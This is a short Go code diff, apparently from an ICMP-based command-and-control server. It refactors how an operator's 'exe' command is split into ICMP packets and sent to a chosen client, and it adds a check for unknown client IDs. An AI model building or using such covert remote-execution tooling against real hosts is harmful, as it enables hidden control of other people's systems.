@@ -133,6 +133,7 @@ func generate_header(segment int, segmented bool) string {
 }
 
 func generate_packet(payload string, segment int) {
+	PACKETQUEUE = make([]icmp.Message, (len(payload)/1460)+1)
 	byteSize := len(payload)
 	// Recursivly calls generate packet if too large
 	if byteSize > 1460 {
@@ -335,23 +336,24 @@ func main() {
 			showclients()
 
 		} else if strings.HasPrefix(input, "exe") {
+
 			// Parse command
 			_, after, _ := strings.Cut(input, " ")
 			id, command, _ := strings.Cut(after, " ")
-			command = strings.TrimRight(command, "\r\n")
-
-			// Create queue for packet sending
-			PACKETQUEUE = make([]icmp.Message, (len(command)/1460)+1)
-
-			execute = true
-
 			clientid := parse_id(id)
-			ipaddr := strings.TrimRight(clients[clientid], "\r\n")
-			generate_packet(command, 0)
-			if DEBUG {
-				fmt.Print("[DEBUG] ", command, " sent to ", clients[clientid])
+			if _, ok := clients[clientid]; ok {
+				command = strings.TrimRight(command, "\r\n")
+				execute = true
+				ipaddr := strings.TrimRight(clients[clientid], "\r\n")
+				generate_packet(command, 0)
+				if DEBUG {
+					fmt.Print("[DEBUG] ", command, " sent to ", clients[clientid])
+				}
+				send_packets(ipaddr, *c)
+			} else {
+				fmt.Println("Invalid Client")
+				continue
 			}
-			send_packets(ipaddr, *c)
 
 		} else if strings.HasPrefix(input, "help") {
 			print_help()
